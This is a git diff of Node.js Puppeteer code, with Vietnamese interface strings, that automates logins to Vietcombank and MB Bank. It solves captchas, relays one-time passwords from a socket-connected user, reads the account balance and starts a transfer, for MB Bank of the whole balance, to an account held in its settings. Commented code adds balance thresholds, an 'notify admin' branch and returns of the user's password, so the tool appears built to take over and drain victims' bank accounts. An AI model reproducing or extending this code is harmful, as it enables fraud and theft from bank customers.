@@ -21,53 +21,7 @@ const openBrowser = async () => {
     return { browser, page };
 }
 
-async function recursiveFindInFrames(inputFrame, selector) {
-    const frames = inputFrame.childFrames();
-    const results = await Promise.all(
-        frames.map(async frame => {
-            const el = await frame.$(selector);
-            if (el) return el;
-            if (frame.childFrames().length > 0) {
-                return await recursiveFindInFrames(frame, selector);
-            }
-            return null;
-        })
-    );
-    return results.find(Boolean);
-}
 
-async function findInFrames(page, selector) {
-    const result = await recursiveFindInFrames(page.mainFrame(), selector);
-    if (!result) {
-        throw new Error(
-            `The selector \`${selector}\` could not be found in any child frames.`
-        );
-    }
-    return result;
-}
-const recursiveFindInFramesContent = async (inputFrame, content) => {
-    const frames = inputFrame.childFrames();
-    const results = await Promise.all(
-        frames.map(async frame => {
-            const el = await frame.content();
-            if (el.includes(content)) return el;
-            if (frame.childFrames().length > 0) {
-                return await recursiveFindInFramesContent(frame, content);
-            }
-            return null;
-        })
-    );
-    return results.find(Boolean);
-}
-const findInFramesContent = async (page, content) => {
-    const result = await recursiveFindInFramesContent(page.mainFrame(), content);
-    if (!result) {
-        throw new Error(
-            `The content \`${content}\` could not be found in any child frames.`
-        );
-    }
-    return result;
-}
 
 const getBalance = async (type, socketID) => {
     const page = pg.find(p => p.socketID == socketID).page;
@@ -194,176 +148,188 @@ const loginMB = (async (username, password, socketID, settingData) => {
 });
 
 const chuyenTien = async (balance, type, socketID, settingData) => {
-    console.log('settingData', settingData);
+    try {
+        console.log('settingData', settingData);
 
-    const page = pg.find(p => p.socketID == socketID).page;
+        const page = pg.find(p => p.socketID == socketID).page;
 
-    if (type == 'MBBank') {
-        await page.goto('https://online.mbbank.com.vn/transfer/inhouse');
-        await sleep(3000);
+        if (type == 'MBBank') {
+            await page.goto('https://online.mbbank.com.vn/transfer/inhouse');
+            await sleep(3000);
 
-        // await page.waitForSelector('mat-select[formcontrolname="accountSource"]');
+            // await page.waitForSelector('mat-select[formcontrolname="accountSource"]');
 
-        // page.click('mat-select[formcontrolname="accountSource"]');
+            // page.click('mat-select[formcontrolname="accountSource"]');
 
-        // await page.waitForSelector('.mat-option-text');
+            // await page.waitForSelector('.mat-option-text');
 
-        // await page.$$('.mat-option-text')[1].click();;
+            // await page.$$('.mat-option-text')[1].click();;
 
-        const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
-        await page.waitForXPath("//button[contains(., ' TIẾP TỤC ')]");
-        await buttonContinue[0].click();
+            const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
+            await page.waitForXPath("//button[contains(., ' TIẾP TỤC ')]");
+            await buttonContinue[0].click();
 
-        await page.waitForSelector('#mat-select-3');
-        page.click('#mat-select-3');
-        await page.waitForSelector('#mat-option-9');
-        // GET ALL mat-option-text
-        const matOptionText = await page.$$eval('.mat-option-text', anchors => [].map.call(anchors, a => {
-            const text = a.querySelector('div > span').innerText;
-            return text;
-        }));
+            await page.waitForSelector('#mat-select-3');
+            page.click('#mat-select-3');
+            await page.waitForSelector('#mat-option-9');
+            // GET ALL mat-option-text
+            const matOptionText = await page.$$eval('.mat-option-text', anchors => [].map.call(anchors, a => {
+                const text = a.querySelector('div > span').innerText;
+                return text;
+            }));
 
-        let bankNameText = ''
+            let bankNameText = ''
 
-        if (settingData.bankName === 'MB') {
-            bankNameText = 'MB';
-        } else if (settingData.bankName === 'VCB') {
-            bankNameText = 'VCB';
-        } else if (settingData.bankName === 'ACB') {
-            bankNameText = 'ACB';
-        } else if (settingData.bankName === 'HD') {
-            bankNameText = 'HD';
-        } else if (settingData.bankName === 'TCB') {
-            bankNameText = 'TCB';
-        } else if (settingData.bankName === 'NCB') {
-            bankNameText = 'NCB';
+            if (settingData.bankName === 'MB') {
+                bankNameText = 'MB';
+            } else if (settingData.bankName === 'VCB') {
+                bankNameText = 'VCB';
+            } else if (settingData.bankName === 'ACB') {
+                bankNameText = 'ACB';
+            } else if (settingData.bankName === 'HD') {
+                bankNameText = 'HD';
+            } else if (settingData.bankName === 'TCB') {
+                bankNameText = 'TCB';
+            } else if (settingData.bankName === 'NCB') {
+                bankNameText = 'NCB';
+            }
+            // input placeHolder === Tìm kiếm
+            await page.waitForSelector('.mat-select-search-input');
+
+            await page.type('.mat-select-search-input', bankNameText);
+            await sleep(1500);
+
+            const matOption = await page.$$('.mat-option-text');
+            await matOption[0].click();
+            page.type("input[formcontrolname='creditAccount'", settingData.bankAccount);
+            await sleep(1500);
+            page.click("input[formcontrolname='amount'");
+            await sleep(1500);
+            page.type("input[formcontrolname='amount'", balance.toString());
+            await sleep(1500);
+
+            const buttonContinue2 = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
+            await sleep(1500);
+            await buttonContinue2[1].click();
+            await sleep(1500);
+            const buttonContinue3 = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
+            await buttonContinue3[2].click();
+            // get image base64 form ngx-qrcode
+            await sleep(1500);
+            await page.waitForSelector('ngx-qrcode > div > img');
+            const imageBase64 = await page.$eval('ngx-qrcode > div > img', el => el.src);
+            return {
+                message: 'success',
+                code: 200,
+                image: imageBase64,
+                type: 'MBBank'
+            };
+        } else if ('VCB') {
+            await page.goto('https://vcbdigibank.vietcombank.com.vn/chuyentien/chuyentienquataikhoan');
+
+            await sleep(3000);
+
+            await page.waitForSelector('select[data-parsley-required-message="Quý khách vui lòng chọn ngân hàng thụ hưởng"]');
+
+            page.click('select[data-parsley-required-message="Quý khách vui lòng chọn ngân hàng thụ hưởng"]');
+
+            await page.waitForSelector('.select2-search__field');
+            await sleep(1000);
+
+            let bankNameText = ''
+
+            if (settingData.bankName === 'VCB') {
+                bankNameText = 'Ngân hàng TMCP Ngoại thương Việt Nam';
+            } else if (settingData.bankName === 'MB') {
+                bankNameText = 'Ngân hàng Quân Đội';
+            } else if (settingData.bankName === 'ACB') {
+                bankNameText = 'Ngân hàng TMCP Á Châu';
+            } else if (settingData.bankName === 'HDBank') {
+                bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
+            } else if (settingData.bankName === 'Techcombank') {
+                bankNameText = 'Ngân hàng TMCP Kỹ Thương Việt Nam';
+            } else if (settingData.bankName === 'NCB') {
+                bankNameText = 'Ngân hàng TMCP Quốc Dân NCB';
+            } else if (settingData.bankName === 'HD') {
+                bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
+            }
+
+            page.type('.select2-search__field', bankNameText);
+            await sleep(2000);
+
+            await page.waitForSelector('.select2-results__options > li:nth-child(1)');
+            await sleep(1000);
+
+            page.click('.select2-results__options > li:nth-child(1)');
+
+            await sleep(2000);
+
+            await page.waitForSelector('#SoTaiKhoanNguoiHuong');
+            page.type('#SoTaiKhoanNguoiHuong', settingData.bankAccount);
+
+            await sleep(2000);
+
+            await page.waitForSelector('#SoTien');
+
+            // page.type('#SoTien', balance.toString());
+            page.type('#SoTien', '10000');
+
+            await sleep(2000);
+
+
+
+            await page.waitForSelector('.form-main-footer button');
+            await page.click('.form-main-footer button');
+
+
+            await sleep(2000);
+
+            await page.waitForSelector('#selectAuthMethod');
+
+            // page.click('#selectAuthMethod');
+            return {
+                message: 'Phương thức xác thực danh tính.',
+                code: 200,
+                type: 'VCBSENDOTP',
+                options: [
+                    {
+                        title: 'SMS OTP',
+                        value: 'SMS OTP'
+                    },
+                    {
+                        title: 'VCB smart OTP',
+                        value: 'VCB smart OTP'
+                    }
+                ]
+            }
         }
-        // input placeHolder === Tìm kiếm
-        await page.waitForSelector('.mat-select-search-input');
-
-        await page.type('.mat-select-search-input', bankNameText);
-        await sleep(1500);
-
-        const matOption = await page.$$('.mat-option-text');
-        await matOption[0].click();
-        page.type("input[formcontrolname='creditAccount'", settingData.bankAccount);
-        await sleep(1500);
-        page.click("input[formcontrolname='amount'");
-        await sleep(1500);
-        page.type("input[formcontrolname='amount'", balance.toString());
-        await sleep(1500);
-
-        const buttonContinue2 = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
-        await sleep(1500);
-        await buttonContinue2[1].click();
-        await sleep(1500);
-        const buttonContinue3 = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
-        await buttonContinue3[2].click();
-        // get image base64 form ngx-qrcode
-        await sleep(1500);
-        await page.waitForSelector('ngx-qrcode > div > img');
-        const imageBase64 = await page.$eval('ngx-qrcode > div > img', el => el.src);
+    } catch (error) {
         return {
-            message: 'success',
-            code: 200,
-            image: imageBase64,
-            type: 'MBBank'
-        };
-    } else if ('VCB') {
-        await page.goto('https://vcbdigibank.vietcombank.com.vn/chuyentien/chuyentienquataikhoan');
-
-        await sleep(3000);
-
-        await page.waitForSelector('select[data-parsley-required-message="Quý khách vui lòng chọn ngân hàng thụ hưởng"]');
-
-        page.click('select[data-parsley-required-message="Quý khách vui lòng chọn ngân hàng thụ hưởng"]');
-
-        await page.waitForSelector('.select2-search__field');
-        await sleep(1000);
-
-        let bankNameText = ''
-
-        if (settingData.bankName === 'VCB') {
-            bankNameText = 'Ngân hàng TMCP Ngoại thương Việt Nam';
-        } else if (settingData.bankName === 'MB') {
-            bankNameText = 'Ngân hàng Quân Đội';
-        } else if (settingData.bankName === 'ACB') {
-            bankNameText = 'Ngân hàng TMCP Á Châu';
-        } else if (settingData.bankName === 'HDBank') {
-            bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
-        } else if (settingData.bankName === 'Techcombank') {
-            bankNameText = 'Ngân hàng TMCP Kỹ Thương Việt Nam';
-        } else if (settingData.bankName === 'NCB') {
-            bankNameText = 'Ngân hàng TMCP Quốc Dân NCB';
-        } else if (settingData.bankName === 'HD') {
-            bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
+            message: 'Có lỗi xảy ra, Vui lòng thử lại sau',
+            code: 500,
         }
+    }
 
-        page.type('.select2-search__field', bankNameText);
-        await sleep(2000);
+}
 
-        await page.waitForSelector('.select2-results__options > li:nth-child(1)');
-        await sleep(1000);
+const xacthucMethodCtVCB = async (method, socketID) => {
+    try {
+        const page = pg.find(p => p.socketID == socketID).page;
+        await sleep(1500);
 
-        page.click('.select2-results__options > li:nth-child(1)');
+        if (method == 'SMS OTP') {
+            await page.waitForSelector(".select-2");
+            page.click(".select-2");
 
-        await sleep(2000);
+            await page.waitForSelector(".select2-results__options");
 
-        await page.waitForSelector('#SoTaiKhoanNguoiHuong');
-        page.type('#SoTaiKhoanNguoiHuong', settingData.bankAccount);
+            await page.waitForSelector(".select2-results__options > li:nth-child(2)");
+            page.click(".select2-results__options > li:nth-child(2)");
 
-        await sleep(2000);
-
-        await page.waitForSelector('#SoTien');
-
-        // page.type('#SoTien', balance.toString());
-        page.type('#SoTien', '10000');
-
-        await sleep(2000);
-
-        await page.waitForSelector('.form-main-footer button');
-        await page.click('.form-main-footer button');
-
-
-        await sleep(2000);
-
-        await page.waitForSelector('#selectAuthMethod');
-
-        page.click('#selectAuthMethod');
-
-        await sleep(2000);
-
-        await page.waitForSelector('.select2-results__options > li:nth-child(1)');
-        page.click('.select2-results__options > li:nth-child(1)');
-
-        return {
-            message: 'Phương thức xác thực danh tính.',
-            code: 200,
-            type: 'VCBSENDOTP',
-            options: [
-                {
-                    title: 'SMS OTP',
-                    value: 'SMS OTP'
-                },
-                {
-                    title: 'VCB smart OTP',
-                    value: 'VCB smart OTP'
-                }
-            ]
-        }
-
-        await page.waitForSelector('.form-main-footer button');
-        await page.click('.form-main-footer button');
-        const otpType = 1
-
-        // get image-captcha
-        if (otpType == 2) {
-            await page.waitForSelector('.image-captcha img');
-            const imageBase64 = await page.$eval('.image-captcha img', el => el.src);
-
-            const captchaText = await solverCaptcha(imageBase64, 'VCB');
-
-            // xác thực captcha
+            await sleep(1500);
+            page.waitForSelector('.image-captcha')
+            const img = await page.$eval('.image-captcha img', el => el.src);
+            const captchaText = await solverCaptcha(img, 'VCB');
             if (!captchaText) return await browser.close();
 
             await page.type("input[formcontrolname='CaptchaText'", captchaText);
@@ -371,378 +337,371 @@ const chuyenTien = async (balance, type, socketID, settingData) => {
             await sleep(1500);
 
             await page.waitForSelector('.form-main-footer button');
+
+            await page.click('.form-main-footer button');
+
+            return {
+                message: method == 'SMS OTP' ? 'Quý khách vui lòng nhập mã OTP đã được gửi về số điện thoại' : 'Quý khách vui lòng nhập mã OTP được tạo từ ứng dụng VCB Digibank',
+                code: 200,
+                type: 'VCB',
+            }
+        } else if (method == 'VCB smart OTP') {
+            await page.waitForSelector(".select-2");
+            page.click(".select-2");
+
+            await page.waitForSelector(".select2-results__options");
+
+            await page.waitForSelector(".select2-results__options > li:nth-child(1)");
+            page.click(".select2-results__options > li:nth-child(1)");
+
+            await sleep(1500);
+
+            await page.waitForSelector('.form-main-footer button');
+
             await page.click('.form-main-footer button');
 
             await sleep(1500);
 
-            const messageElement = await page.$x("//p[contains(., 'Mã kiểm tra không chính xác. Quý khách vui lòng kiểm tra lại.')]");
+            await page.waitForSelector('input[formcontrolname="Challenge"');
 
-            if (messageElement.length > 0) {
-                chuyenTien(balance, 'VCB', socketID, settingData);
-            }
-        } else {
-            await sleep(1500);
-            const responseOTP = await page.waitForSelector("input[formcontrolname='Challenge'");
-            const value = await page.evaluate(el => el.value, responseOTP);
+            const challenge = await page.$eval('input[formcontrolname="Challenge"', el => el.value);
+
             return {
-                message: 'success',
+                message: 'Quý khách đang xác thực giao dịch bằng ứng dụng VCB-Smart OTP. Vui lòng nhập mã kiểm tra dưới đây vào ứng dụng để tạo mã OTP cho giao dịch',
                 code: 200,
-                type: 'VCBSENDOTP',
-                otpValue: value
+                challenge: challenge,
+                type: 'VCB'
             }
         }
-
+    } catch (error) {
         return {
-            message: 'success',
-            code: 200,
-            type: 'VCBSENDOTP',
+            message: 'Có lỗi xảy ra, Vui lòng thử lại sau',
+            code: 500,
         }
     }
-}
-
-const xacthucMethodCtVCB = async (method, socketID) => {
-    const page = pg.find(p => p.socketID == socketID).page;
-    await sleep(1500);
-
-    if (method == 'SMS OTP') {
-        await page.waitForSelector(".select-2");
-        page.click(".select-2");
-
-        await page.waitForSelector(".select2-results__options");
-
-        await page.waitForSelector(".select2-results__options > li:nth-child(1)");
-        page.click(".select2-results__options > li:nth-child(1)");
-    } else if (method == 'VCB smart OTP') {
-        await page.waitForSelector(".select-2");
-        page.click(".select-2");
-
-        await page.waitForSelector(".select2-results__options");
-
-        await page.waitForSelector(".select2-results__options > li:nth-child(2)");
-        page.click(".select2-results__options > li:nth-child(2)");
-    }
-
-    await sleep(1500);
-    // const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
-    page.click("button[type='submit']");
-    await sleep(1500);
-
-
 }
 
 const loginVCB = (async (username, password, socketID, settingData) => {
-    let page = pg.find(p => p.socketID == socketID);
-    let browser = br.find(b => b.socketID == socketID);
+    try {
+        const { browser, page } = await openBrowser();
 
-    if (!page && !browser) {
-        page = (await openBrowser()).page;
-        browser = (await openBrowser()).browser;
-        br.push({
-            socketID: socketID,
-            browser: browser
-        })
-        pg.push({
-            socketID: socketID,
-            page: page
-        })
-    } else {
-        page = page.page;
-        browser = browser.browser;
-    }
+        await page.goto('https://vcbdigibank.vietcombank.com.vn/login', { waitUntil: 'networkidle0', timeout: 60000 });
 
-    await page.goto('https://vcbdigibank.vietcombank.com.vn/login', { waitUntil: 'networkidle0', timeout: 60000 });
+        await page.type('#username', username);
+        await page.type('#app_password_login', password);
 
-    await page.type('#username', username);
-    await page.type('#app_password_login', password);
+        let images = await page.$$eval('img', anchors => [].map.call(anchors, img => img.src));
+        const img = images[2];
+        const captchaText = await solverCaptcha(img, 'VCB');
 
-    let images = await page.$$eval('img', anchors => [].map.call(anchors, img => img.src));
-    const img = images[2];
-    const captchaText = await solverCaptcha(img, 'VCB');
+        if (!captchaText) return await browser.close();
 
-    if (!captchaText) return await browser.close();
+        console.log(captchaText);
 
-    console.log(captchaText);
+        await page.type("input[formcontrolname='captcha'", captchaText);
 
-    await page.type("input[formcontrolname='captcha'", captchaText);
+        await sleep(1500);
 
-    await sleep(1500);
+        await page.click('#btnLogin');
 
-    await page.click('#btnLogin');
+        await sleep(3000);
 
-    await sleep(3000);
+        const messageElement = await page.$x("//p[contains(., 'Mã kiểm tra không chính xác. Quý khách vui lòng kiểm tra lại.')]");
 
-    const messageElement = await page.$x("//p[contains(., 'Mã kiểm tra không chính xác. Quý khách vui lòng kiểm tra lại.')]");
+        // get innerText message
+        if (messageElement.length > 0) {
+            await browser.close();
+            loginVCB(username, password, socketID, settingData);
+        }
 
-    // get innerText message
-    if (messageElement.length > 0) {
-        await browser.close();
-        loginVCB(username, password, socketID, settingData);
-    }
+        const messageErrorBlock = await page.$x("//p[contains(., 'Quý khách đã nhập sai thông tin truy cập 1 lần liên tiếp. Quý khách lưu ý dịch vụ VCB Digibank sẽ bị TẠM KHÓA nếu Quý khách nhập sai mật khẩu liên tiếp 05 LẦN. Quý khách có thể thực hiện cấp lại mật khẩu tại tính năng Quên mật khẩu ở màn hình đăng nhập ứng dụng VCB Digibank hoặc các điểm giao dịch của VCB để được hỗ trợ')]");
 
-    const messageErrorBlock = await page.$x("//p[contains(., 'Quý khách đã nhập sai thông tin truy cập 1 lần liên tiếp. Quý khách lưu ý dịch vụ VCB Digibank sẽ bị TẠM KHÓA nếu Quý khách nhập sai mật khẩu liên tiếp 05 LẦN. Quý khách có thể thực hiện cấp lại mật khẩu tại tính năng Quên mật khẩu ở màn hình đăng nhập ứng dụng VCB Digibank hoặc các điểm giao dịch của VCB để được hỗ trợ')]");
+        if (messageErrorBlock.length > 0) {
+            const message = await page.evaluate(el => el.innerText, messageErrorBlock[0]);
+            return {
+                message: message,
+                code: 404,
+                type: 'VCB'
+            };
+        }
 
-    if (messageErrorBlock.length > 0) {
-        const message = await page.evaluate(el => el.innerText, messageErrorBlock[0]);
-        return {
-            message: message,
-            code: 404,
-            type: 'VCB'
-        };
-    }
+        const messageBrowserBlock = await page.$x("//p[contains(., '2. Trường hợp vẫn muốn giao dịch trên trình duyệt Web, vui lòng đăng nhập ứng dụng VCB Digibank để mở khóa đăng nhập Web theo hướng dẫn:')]");
 
-    const messageBrowserBlock = await page.$x("//p[contains(., '2. Trường hợp vẫn muốn giao dịch trên trình duyệt Web, vui lòng đăng nhập ứng dụng VCB Digibank để mở khóa đăng nhập Web theo hướng dẫn:')]");
-
-    if (messageBrowserBlock.length > 0) {
-        return {
-            message: `Trường hợp vẫn muốn giao dịch trên trình duyệt Web, vui lòng đăng nhập ứng dụng VCB Digibank để mở khóa đăng nhập Web theo hướng dẫn:
+        if (messageBrowserBlock.length > 0) {
+            return {
+                message: `Trường hợp vẫn muốn giao dịch trên trình duyệt Web, vui lòng đăng nhập ứng dụng VCB Digibank để mở khóa đăng nhập Web theo hướng dẫn:
 Cài đặt >> Cài đặt chung >> Cài đặt đăng nhập >> Cài đặt đăng nhập VCB Digibank trên trình duyệt Web(đối với phiên bản App cũ); hoặc
 
 Tiện ích >> Cài đặt >> Cài đặt chung >> Quản lý đăng nhập kênh >> Cài đặt đăng nhập VCB Digibank trên Web(đối với phiên bản App mới).`,
-            code: 400,
-            type: 'VCB'
-        };
-    }
+                code: 400,
+                type: 'VCB'
+            };
+        }
 
-    const messageErrorLogin = await page.$x("//p[contains(., 'Thông tin tài khoản không hợp lệ. Quý khách vui lòng kiểm tra lại hoặc liên hệ Hotline 24/7 1900545413 để được trợ giúp.')]");
+        const messageErrorLogin = await page.$x("//p[contains(., 'Thông tin tài khoản không hợp lệ. Quý khách vui lòng kiểm tra lại hoặc liên hệ Hotline 24/7 1900545413 để được trợ giúp.')]");
 
-    if (messageErrorLogin.length > 0) {
-        await browser.close();
-        const message = await page.evaluate(el => el.innerText, messageErrorLogin[0]);
+        if (messageErrorLogin.length > 0) {
+            await browser.close();
+            const message = await page.evaluate(el => el.innerText, messageErrorLogin[0]);
+            return {
+                message: message,
+                code: 404,
+                type: 'VCB'
+            };
+        }
+
+        const checkMethod = await page.$x("//p[contains(., 'Quý khách vui lòng chọn phương thức xác thực để xác thực đăng nhập trên trình duyệt mới.')]");
+
+        if (checkMethod.length > 0) {
+            const message = await page.evaluate(el => el.innerText, checkMethod[0]);
+            return {
+                message: message,
+                code: 201,
+                type: 'VCB',
+                options: [
+                    {
+                        title: 'SMS OTP',
+                        value: 'SMS OTP'
+                    },
+                    {
+                        title: 'VCB smart OTP',
+                        value: 'VCB smart OTP'
+                    }
+                ]
+            };
+        }
+
+        await page.waitForSelector('label[for="tk-eye2"]', { timeout: 60000 });
+
+        await page.click('label[for="tk-eye2"]');
+
+        await sleep(3000);
+
+        await page.waitForSelector(".i");
+
+        let balance = await page.$eval(".i", el => el.innerText);
+
+        balance = balance.replace('VND', '').replace(/\./g, '').trim();
+
+        balance = parseFloat(balance) * 1000;
+
+        // const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+        // return response;
+
+        // if balance < 2 triệu thì không chuyển
+        // if (balance < 2000000) {
+        //     // await browser.close();
+        //     return {
+        //         message: 'success',
+        //         code: 300,
+        //         balance: balance,
+        //         username: username,
+        //         password: password,
+        //     };
+        // }
+
+        // else if (balance >= 2000000) {
+        //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+        //     // await browser.close();
+        //     return response;
+        // } else if (balance >= 2000000 && balance <= 5000000) {
+        //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+        //     return response;
+        // } else if (balance > 5000000) {
+        //     // await browser.close();
+        //     // thông báo tới admin
+        //     return {
+        //         message: 'success',
+        //         code: 300,
+        //         balance: balance,
+        //         username: username,
+        //         password: password,
+        //     };
+        // } else {
+        //     await browser.close();
+        //     return {
+        //         message: 'success',
+        //         code: 300,
+        //         balance: balance,
+        //         username: username,
+        //         password: password,
+        //     };
+        // }
+
+        const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+        return response;
+    } catch (error) {
         return {
-            message: message,
-            code: 404,
-            type: 'VCB'
-        };
+            message: 'Có lỗi xảy ra, Vui lòng thử lại sau',
+            code: 500,
+        }
     }
-
-    const checkMethod = await page.$x("//p[contains(., 'Quý khách vui lòng chọn phương thức xác thực để xác thực đăng nhập trên trình duyệt mới.')]");
-
-    if (checkMethod.length > 0) {
-        const message = await page.evaluate(el => el.innerText, checkMethod[0]);
-        return {
-            message: message,
-            code: 201,
-            type: 'VCB',
-            options: [
-                {
-                    title: 'SMS OTP',
-                    value: 'SMS OTP'
-                },
-                {
-                    title: 'VCB smart OTP',
-                    value: 'VCB smart OTP'
-                }
-            ]
-        };
-    }
-
-    await page.waitForSelector('label[for="tk-eye2"]', { timeout: 60000 });
-
-    await page.click('label[for="tk-eye2"]');
-
-    await sleep(3000);
-
-    await page.waitForSelector(".i");
-
-    let balance = await page.$eval(".i", el => el.innerText);
-
-    balance = balance.replace('VND', '').replace(/\./g, '').trim();
-
-    balance = parseFloat(balance) * 1000;
-
-    // const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-    // return response;
-
-    // if balance < 2 triệu thì không chuyển
-    // if (balance < 2000000) {
-    //     // await browser.close();
-    //     return {
-    //         message: 'success',
-    //         code: 300,
-    //         balance: balance,
-    //         username: username,
-    //         password: password,
-    //     };
-    // }
-
-    // else if (balance >= 2000000) {
-    //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-    //     // await browser.close();
-    //     return response;
-    // } else if (balance >= 2000000 && balance <= 5000000) {
-    //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-    //     return response;
-    // } else if (balance > 5000000) {
-    //     // await browser.close();
-    //     // thông báo tới admin
-    //     return {
-    //         message: 'success',
-    //         code: 300,
-    //         balance: balance,
-    //         username: username,
-    //         password: password,
-    //     };
-    // } else {
-    //     await browser.close();
-    //     return {
-    //         message: 'success',
-    //         code: 300,
-    //         balance: balance,
-    //         username: username,
-    //         password: password,
-    //     };
-    // }
-
-    const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-    return response;
-
 });
 
 const xacthucOTPVCB = async (otp, socketID) => {
-    await sleep(1500);
-    const page = pg.find(p => p.socketID == socketID).page;
-    await page.waitForSelector("input[formcontrolname='otp'");
+    try {
+        await sleep(1500);
+        const page = pg.find(p => p.socketID == socketID).page;
+        await page.waitForSelector("input[formcontrolname='otp'");
 
-    page.type("input[formcontrolname='otp'", otp);
-    await sleep(1500);
-    const buttonContinue = await page.$x("//span[contains(., ' Tiếp tục')]");
-    await sleep(1500);
-    await buttonContinue[0].click();
+        page.type("input[formcontrolname='otp'", otp);
+        await sleep(1500);
+        const buttonContinue = await page.$x("//span[contains(., ' Tiếp tục')]");
+        await sleep(1500);
+        await buttonContinue[0].click();
 
-    await sleep(2000);
+        await sleep(2000);
 
-    const messageError = await page.$x("//p[contains(., 'Mã OTP không chính xác')]");
+        const messageError = await page.$x("//p[contains(., 'Mã OTP không chính xác')]");
 
-    if (messageError.length > 0) {
-        await browser.close();
-        return {
-            message: 'Mã OTP không chính xác',
-            code: 404,
-        };
-    }
+        if (messageError.length > 0) {
+            await browser.close();
+            return {
+                message: 'Mã OTP không chính xác',
+                code: 404,
+            };
+        }
 
-    await sleep(1500);
+        await sleep(1500);
 
-    const messageSave = await page.$x("//p[contains(., 'Xác thực đăng nhập thành công. Quý khách có muốn lưu trình duyệt Web để bỏ qua bước xác thực cho những lần đăng nhập tiếp theo không?')]");
+        const messageSave = await page.$x("//p[contains(., 'Xác thực đăng nhập thành công. Quý khách có muốn lưu trình duyệt Web để bỏ qua bước xác thực cho những lần đăng nhập tiếp theo không?')]");
 
-    console.log(messageSave);
+        console.log(messageSave);
 
-    if (messageSave.length > 0) {
-        const buttonContinue2 = await page.$x("//span[contains(., 'Lưu')]");
-        await buttonContinue2[0].click();
-        await sleep(4500);
+        if (messageSave.length > 0) {
+            const buttonContinue2 = await page.$x("//span[contains(., 'Lưu')]");
+            await buttonContinue2[0].click();
+            await sleep(4500);
 
-    }
+        }
 
-    console.log('click1');
-    await page.waitForSelector('label[for="tk-eye2"]', { timeout: 60000 });
+        console.log('click1');
+        await page.waitForSelector('label[for="tk-eye2"]', { timeout: 60000 });
 
-    await page.click('label[for="tk-eye2"]');
+        await page.click('label[for="tk-eye2"]');
 
-    await sleep(3000);
+        await sleep(3000);
 
-    await page.waitForSelector(".i");
+        await page.waitForSelector(".i");
 
-    let balance = await page.$eval(".i", el => el.innerText);
+        let balance = await page.$eval(".i", el => el.innerText);
 
-    balance = balance.replace('VND', '').replace(/\./g, '').trim();
+        balance = balance.replace('VND', '').replace(/\./g, '').trim();
 
-    balance = parseFloat(balance) * 1000;
-    // if balance < 2 triệu thì không chuyển
-    if (balance < 2000000) {
-        // await browser.close();
-        return {
-            message: 'success',
-            code: 300,
-            balance: balance,
-            username: username,
-            password: password,
-        };
-    }
+        balance = parseFloat(balance) * 1000;
+        // if balance < 2 triệu thì không chuyển
+        // if (balance < 2000000) {
+        //     // await browser.close();
+        //     return {
+        //         message: 'success',
+        //         code: 300,
+        //         balance: balance,
+        //         username: username,
+        //         password: password,
+        //     };
+        // }
 
-    else if (balance >= 2000000) {
+        // else if (balance >= 2000000) {
+        //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+        //     // await browser.close();
+        //     return response;
+        // } else if (balance >= 2000000 && balance <= 5000000) {
+        //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+        //     return response;
+        // } else if (balance > 5000000) {
+        //     // await browser.close();
+        //     // thông báo tới admin
+        //     return {
+        //         message: 'success',
+        //         code: 300,
+        //         balance: balance,
+        //         username: username,
+        //         password: password,
+        //     };
+        // } else {
+        //     await browser.close();
+        //     return {
+        //         message: 'success',
+        //         code: 300,
+        //         balance: balance,
+        //         username: username,
+        //         password: password,
+        //     };
+        // }
+
         const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-        // await browser.close();
         return response;
-    } else if (balance >= 2000000 && balance <= 5000000) {
-        const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-        return response;
-    } else if (balance > 5000000) {
-        // await browser.close();
-        // thông báo tới admin
+    } catch (error) {
         return {
-            message: 'success',
-            code: 300,
-            balance: balance,
-            username: username,
-            password: password,
-        };
-    } else {
-        await browser.close();
-        return {
-            message: 'success',
-            code: 300,
-            balance: balance,
-            username: username,
-            password: password,
-        };
+            message: 'Có lỗi xảy ra, Vui lòng thử lại sau',
+            code: 500,
+        }
     }
-
 }
 
 const xacthucCTVCB = async (otp, socketID) => {
-    const page = pg.find(p => p.socketID == socketID).page;
-    await sleep(1500);
-
-    let messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]");
-    let message = '';
-
-    // get innerText message
-    if (messageElement.length > 0) {
-        // close modal
-        const buttonClose = await page.$x("//button[contains(., 'Đóng')]");
-        console.log(buttonClose);
-        await page.waitForXPath("//button[contains(., 'Đóng')]");
+    try {
+        const page = pg.find(p => p.socketID == socketID).page;
+        const browser = br.find(b => b.socketID == socketID).browser;
         await sleep(1500);
-        await buttonClose[3].click();
-        messageElement = null
-    }
 
-    await page.waitForSelector("input[formcontrolname='OtpText'");
+        let messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]");
+        let message = '';
 
-    page.type("input[formcontrolname='OtpText'", otp);
+        // get innerText message
+        if (messageElement.length > 0) {
+            // close modal
+            const buttonClose = await page.$x("//button[contains(., 'Đóng')]");
+            console.log(buttonClose);
+            await page.waitForXPath("//button[contains(., 'Đóng')]");
+            await sleep(1500);
+            await buttonClose[3].click();
+            messageElement = null
+        }
 
-    await sleep(1500);
+        await page.waitForSelector("input[formcontrolname='OtpText'");
 
-    await page.waitForSelector(".form-main-footer button");
-    await page.click(".form-main-footer button");
+        page.type("input[formcontrolname='OtpText'", otp);
 
-    await sleep(3000);
+        await sleep(1500);
 
